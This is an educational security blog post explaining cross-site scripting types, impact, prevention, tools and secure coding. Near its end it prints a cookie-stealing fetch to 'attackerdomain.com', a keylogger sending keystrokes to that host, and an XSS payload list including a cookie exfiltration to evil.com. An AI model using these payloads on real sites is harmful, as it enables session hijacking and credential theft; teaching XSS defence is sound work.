# Cross-Site-Scripting (XSS)

- **Source URL:** https://securitycipher.com/docs/cross-site-scripting-xss
- **Fetched from:** https://securitycipher.com/docs/security/vulnerability-explain/cross-site-scripting-xss/
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1520 (id 1520)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Welcome to our blog on the topic of Cross-Site Scripting (XSS). XSS is a type of security vulnerability that can occur in web applications, allowing an attacker to inject malicious scripts into web pages viewed by other users. In this blog, we will be diving into the details of what XSS is, how it works, and the different types that exist. We will also be discussing the maximum impact that an XSS attack can have, as well as the steps that can be taken to prevent such an attack from occurring. Additionally, we will be providing an overview of tools that can be used to find XSS vulnerabilities and showcasing examples of both vulnerable and secure code for XSS. Finally, we will be presenting a list of common XSS payloads that attackers use. By the end of this blog, you will have a strong understanding of XSS and the measures that can be taken to protect against it.

## What is XSS ?

Cross-Site Scripting (XSS) is a type of security vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. The injected script can steal sensitive information such as login credentials or personal data, or it can perform actions on behalf of the user, such as making unauthorized transactions. XSS attacks can be carried out in a variety of ways, such as by injecting script into a web page through a form input or by exploiting a vulnerability in a website's code. To prevent XSS attacks, developers should use a combination of input validation, output encoding, and context-aware output filtering. Additionally, web browsers can be configured with XSS protection to block malicious scripts from executing. It's important to note that XSS is a client-side attack, meaning that the malicious script is executed on the user's computer or device, rather than on the server.

## How Does XSS Work

A website that allows users to search for products. The website have a search bar where users can input their search query, but if the website does not properly validate the input, an attacker could inject a script into their search query. The script could then be executed when the search results are displayed, allowing the attacker to steal sensitive information or perform actions on behalf of the user.

For example, when the user search for a product, the attacker injects the below script in the search bar. When the user clicks on search, this script will pop up an alert with website cookie, indicating an XSS attack.

`<script>alert(document.domain)</script>`
## Types of XSS

There are three main types of Cross-Site Scripting (XSS) attacks:

1. **Reflected XSS**: In this type of attack, the malicious script is included in the URL and is reflected back to the user's browser by the web application. This type of attack is typically used in phishing campaigns, where the attacker sends a link to the victim that contains the malicious script. When the victim clicks on the link, the script is executed by their browser, allowing the attacker to steal sensitive information such as login credentials.
2. **Stored XSS**: In this type of attack, the malicious script is stored on the web server and is served to all users who access the affected page. This type of attack is particularly dangerous because it can affect a large number of users, and the attacker does not need to lure the victim to click on a link.
3. **DOM-based XSS**: This type of XSS attack occurs when a web application's client-side JavaScript code is vulnerable to injection, which allows an attacker to run malicious script in the victim's browser. The malicious script is not sent to the server, but it is executed in the browser.

All of the types of XSS attacks take advantage of vulnerabilities in web applications that allow an attacker to inject malicious code into a website, which is then executed by the victim's browser. This can lead to sensitive information being stolen, such as login credentials, or the execution of other malicious actions on the victim's computer.

### Reflected XSS

Reflected XSS (Cross-Site Scripting) is a type of web application vulnerability that allows an attacker to inject malicious scripts into a website, which are then executed by the victim's browser. This type of attack occurs when a website receives user-supplied input and immediately reflects it back to the user without proper validation or sanitization. The malicious script is typically embedded in a link or form, and when the victim clicks on it, the script is executed in their browser, giving the attacker access to sensitive information such as login credentials and personal data.

Reflected XSS attacks are particularly dangerous because they can easily spread through social media and email, as victims may unknowingly click on a link or fill out a form containing malicious code. They can also be used to launch phishing attacks, steal session cookies, and redirect victims to malicious websites.

### Stored XSS

Stored XSS, also known as persistent XSS, is a type of cross-site scripting (XSS) vulnerability that occurs when an attacker is able to inject malicious code into a website or application, which is then stored and executed on the victim's browser when they access the affected page. This type of attack can be particularly dangerous as it allows the attacker to target a larger number of users and potentially steal sensitive information, such as login credentials or personal data.

Stored XSS attacks typically occur when an attacker is able to exploit a vulnerability in the application's input validation and output encoding mechanisms. For example, if a website allows users to submit comments or other user-generated content, an attacker may be able to inject malicious code into the website's database, which will then be executed when other users view the affected page.

### DOM based XSS

DOM-based XSS (Cross-Site Scripting) is a type of security vulnerability that occurs when a web application executes malicious code that is injected into the Document Object Model (DOM). This type of attack occurs when the application does not properly validate input from the user, allowing an attacker to inject malicious code into the DOM.

The DOM is a hierarchical tree-like structure that represents the structure of a web page. It allows developers to access and manipulate the elements of a web page using JavaScript. When a user interacts with a web page, the browser sends a request to the server for the HTML code, which is then parsed and rendered by the browser. The rendered HTML code is then converted into the DOM, which allows the browser to interact with the web page.

When an attacker injects malicious code into the DOM, it can be executed by the browser, allowing the attacker to steal sensitive information or take control of the victim's browser. This type of attack is particularly dangerous because it can be difficult to detect and prevent.

## Difference between Reflected, Stored and DOM-based XSS

| **Type of XSS** | **Description** | **Example** | 
| Reflected XSS | Also known as non-persistent XSS, this type of attack occurs when a malicious script is injected into a website through a user-supplied input, such as a search bar or form field. The script is then executed by the browser, allowing the attacker to steal sensitive information or perform other malicious actions. | A user visits a website and enters a malicious script into a search bar, which is then reflected back to the user in the search results. | 
| Stored XSS | Also known as persistent XSS, this type of attack occurs when a malicious script is stored on a website, such as in a forum post or comment. The script is then executed by other users who visit the website, allowing the attacker to steal sensitive information or perform other malicious actions. | A user posts a malicious script on a website's forum, which is then executed by other users who visit the forum. | 
| DOM-based XSS | This type of attack occurs when a malicious script is injected into a website's Document Object Model (DOM), rather than the website's source code. This allows the attacker to bypass security measures that only check the source code and execute the script in the browser. | A user visits a website and enters a malicious script into a form field, which is then executed by the browser and allowed to access sensitive information stored in the DOM. | 

## Maximum Impact from XSS

1. **Stealing sensitive information**: One of the most dangerous outcomes of cross site scripting is the ability for attackers to steal sensitive information such as login credentials, credit card information, and personal data. This can lead to identity theft, financial fraud, and other serious issues for the affected individuals.
2. **Spreading malware**: Another potential impact of XSS is the ability for attackers to spread malware to unsuspecting users. This can be done by injecting malicious code into a web page that, when executed, downloads malware onto the user's computer. This can lead to serious security breaches and data loss.
3. **Phishing**: Attackers can also use XSS to launch phishing attacks, where they trick users into providing sensitive information by disguising themselves as a legitimate website or organization. This can lead to the theft of login credentials, financial information, and other sensitive data.
4. **Website defacement**: Attackers can use XSS to gain access to the back-end of a website and make unauthorized changes, such as replacing the website's content with offensive or malicious material. This can lead to damage to the website's reputation and loss of trust from users.
5. **Session hijacking**: Attackers can use XSS to steal session cookies, which can be used to impersonate a legitimate user and gain access to sensitive information or perform unauthorized actions. This can lead to a loss of privacy and security for the affected users.
6. **Keylogger**: One of the other impacts of XSS can be the use of keyloggers. An attacker can inject a keylogger script into a website, which when executed, records keystrokes of the users visiting the website. This can lead to the theft of login credentials, financial information and other sensitive data.

## Prevention of XSS

1. **Input validation**: One of the most important prevention methods for cross-site scripting is input validation. This involves checking all user input to ensure that it only contains valid characters and does not contain any malicious code.
2. **Use of encoding**: Another effective prevention method is to use encoding techniques such as HTML encoding or JavaScript encoding to convert any potentially harmful characters into their safe counterparts.
3. **Use of Content Security Policy (CSP)**: CSP is a security feature that allows web developers to specify which sources of content are allowed to be loaded on a website. This can help prevent cross-site scripting by blocking any attempts to load malicious scripts from untrusted sources.
4. **Use of Web Application Firewall (WAF)**: A Web Application Firewall (WAF) is a security tool that sits between a web application and the internet, monitoring and analyzing incoming traffic. It can help prevent cross-site scripting by detecting and blocking any malicious requests before they reach the web application. This can include inspecting requests for known patterns of cross-site scripting attacks and blocking them before they can cause harm. WAFs can also be configured to block any requests that contain suspicious characters or patterns, providing an additional layer of security.
5. **Use of whitelisting**: Whitelisting, which only allows specific scripts and code to run on a website, can help prevent cross-site scripting by blocking any unauthorized or malicious scripts.
6. **X-XSS-protection header**: X-XSS-Protection is a security feature that helps to prevent cross-site scripting (XSS) attacks. This feature is typically implemented in web browsers and web servers, and it works by detecting and blocking malicious scripts from being executed on a website.

## Tools to check XSS

1. **W3AF**: W3AF is an open source web application security scanner that can be used to detect a wide range of vulnerabilities, including XSS. It is written in Python and can be used on Windows, Linux, and macOS.
2. **XSStrike**: XSStrike is an advanced XSS scanner that can identify and exploit XSS vulnerabilities in web applications. It includes a unique feature that can generate payloads based on the context of the application.
3. **XSS-Radar**: XSS-Radar is an XSS scanner that can be used to detect and exploit XSS vulnerabilities in web applications. It is easy to use and can be used to test a wide range of applications.
4. **XSSer**: This tool is specifically designed to automate the detection of XSS vulnerabilities. It can be used to test web applications by injecting payloads into various input fields and analyzing the response.
5. **XSSHunter**: XSS Hunter is a tool that allows you to find cross-site scripting (XSS) vulnerabilities in web applications. It is an open-source tool that can be used to test both single-page and traditional web applications.

## Vulnerable and secure code of XSS

The following example illustrates the contrast between a vulnerable and a secure code for XSS. Through this demonstration, one can gain a deeper understanding of how XSS vulnerabilities can occur within a code and the measures that can be taken to mitigate such risks and ensure the code's security.

### Vulnerable code

```
String userInput = request.getParameter("userInput");
out.println("<p>You entered: " + userInput + "</p>");
```
This code takes user input from a request and directly prints it to the page without any validation or sanitization. An attacker could inject malicious script into the userInput parameter, which would then be executed in the victim's browser.

### Secure code

```
String userInput = request.getParameter("userInput");
userInput = org.owasp.esapi.ESAPI.encoder().encodeForHTML(userInput);
out.println("<p>You entered: " + userInput + "</p>");
```
This code uses the OWASP ESAPI library to encode the userInput for use in HTML, which prevents any special characters (such as \< and >) from being interpreted as script. This eliminates the possibility of XSS attacks.

It is also important to note that, in addition to the above, you should always validate the user input to ensure that it is valid and conforms to the expected format. And also use a framework that can automatically take care of the protection, such as Spring Security or Apache Shiro.

For further information on secure coding practices that can be employed to prevent XSS, be sure to visit our blog at [https://securitycipher.com/2022/12/15/secure-coding-practices-for-developers](https://securitycipher.com/2022/12/15/secure-coding-practices-for-developers). Here, you will find in-depth insights and guidance on how to implement best practices in your development process to safeguard against XSS vulnerabilities.

## Some XSS Code snippets:

It is important for security professionals to understand the potential dangers of XSS attacks, including the ability for an attacker to steal sensitive information such as user cookies and keystrokes. However, it is illegal and unethical to use such knowledge for malicious purposes. The following code snippets should only be used for educational and research purposes and must never be used in an unauthorized or harmful way.

### Steal Cookies

This is a JavaScript code that uses the Fetch API to send a request to a specified URL, "https://attackerdomain.com" with the method 'POST'. It attaches the current cookies of the website to the request and sends it to the specified URL. This can be used by an attacker to steal the user's session cookie and use it to impersonate the user on the website. It's important to keep in mind that this type of script can be used for malicious purposes and can put user's personal and sensitive information at risk and should not be used in any illegal or unethical way.

```
<script>
fetch('https://attackerdomain.com', {
method: 'POST',
body:document.cookie
});
</script>
```
### Keylogger

This code is a simple keylogger written in JavaScript. It creates an empty variable called "keys" and assigns an event listener to the document that triggers when any key is pressed. When a key is pressed, the function captures the key press event, extracts the key code or character code of the pressed key, converts it to a string, and appends it to the "keys" variable. The script also creates a setInterval function that runs every 1000 milliseconds (1 second) and sends the current value of the "keys" variable to a remote server (http://attackerdomain.com/keylogger.php) through an image request. After sending the data, the "keys" variable is reset to an empty string, so that it can capture new keystrokes. It is important to note that this script is used to capture and send the keystrokes to a remote server, thus it can be used for malicious purposes and must not be used without authorization.

```
var keys=''; 
document.onkeypress = function(e) { 
get = window.event?event:e; 
key = get.keyCode?get.keyCode:get.charCode; 
key = String.fromCharCode(key); 
keys+=key; 
} 
window.setInterval(function(){ 
new Image().src = 'http://attackerdomain.com/keylogger.php?c='+keys; 
keys = ''; 
}, 1000);
```
## Top XSS payloads used by Security Researchers

As a security researcher, it is important to be familiar with the most commonly used XSS payloads in order to effectively detect and prevent such attacks. However, it is illegal and unethical to use these payloads for malicious purposes. Instead, this knowledge should be used to improve security for both yourself and others. For a more extensive list of XSS payloads, you can refer to the following resource:

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

```
"<script>alert(1)</script>"
"<img src='javascript:alert(1)'>"
"><script>alert(1)</script>"
"<svg onload=alert(1)>"
"<script>document.location='http://evil.com/steal.php?'+document.cookie</script>"
"<script>document.write('<img src=x onerror=alert(1)>')</script>"
"<iframe src='javascript:alert(1)'>"
"<a href='javascript:alert(1)'>click me</a>"
"<body onload='alert(1)'>"
"<script>prompt(1, 'xss')</script>"
```
## Conclusion

In conclusion, cross-site scripting (XSS) is a type of security vulnerability that can occur in web applications and can be exploited by attackers to inject malicious code into web pages viewed by other users. In this blog, we covered the basics of XSS, including how it works and the different types of XSS attacks. We also discussed the potential impact of XSS on both website owners and users, and highlighted various prevention techniques that can be used to protect against XSS vulnerabilities. Additionally, we discussed tools that can be used to identify XSS vulnerabilities in web applications, as well as provided an example of vulnerable and secure code for XSS. Lastly, we discussed some of the most commonly used XSS payloads. It's essential to be aware of XSS and to take the necessary precautions to protect your website and users from potential XSS attacks. By implementing proper validation and sanitization techniques, and by utilizing available tools, website owners can help to ensure the security of their web applications.
